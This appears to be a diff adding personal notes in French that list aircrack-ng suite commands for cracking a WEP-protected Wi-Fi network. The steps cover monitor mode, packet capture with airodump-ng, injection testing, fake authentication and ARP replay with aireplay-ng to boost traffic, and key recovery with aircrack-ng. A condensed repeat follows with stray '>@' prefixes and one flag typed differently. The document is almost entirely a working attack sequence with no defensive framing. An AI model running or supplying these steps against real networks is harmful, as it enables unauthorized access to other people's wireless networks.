@@ -1,0 +1,41 @@
+1- Carte en mode monitor
+
+2- Verification des points d'acces
+sudo airodump-ng wlan0mon
+
+3- Demarrage airodump pour ecriture fichier (WEP)
+$ sudo airodump-ng wlan0mon --channel <ch> -w WEP
+
+4- Lancement test d'injection
+$ aireplay-ng -9 -a <MAC BSSID> wlan0mon
+>>> observation des paquets.
+
+ou 
+
+$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
+>>> authentification aupres du point d'acces.
+$ sudo aireplay-ng --arpreplay -b <MAC BSSID> -h <MAC kali> wlan0mon
+>>> augmentation du trafic.
+
+5- Lancement du crack
+$ sudo aircrack-ng WEP-01.cap
+
+>@
+>@##############################################################
+>@
+>@* Mode monitor
+>@
+>@* Airodump en ecriture 
+>@$ sudo airodump-ng wlan0mon --channel <ch> -W WEP
+>@
+>@* Trafic
+>@$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
+>@$ sudo aireplay-ng --arpreplay -b <MAC BSSID> -h <MAC kali> wlan0mon
+>@
+>@* Crack
+$ sudo aircrack-ng WEP-01.cap -b <MAC BSSID>
+>@
+>@##############################################################
+>@
+>@
+
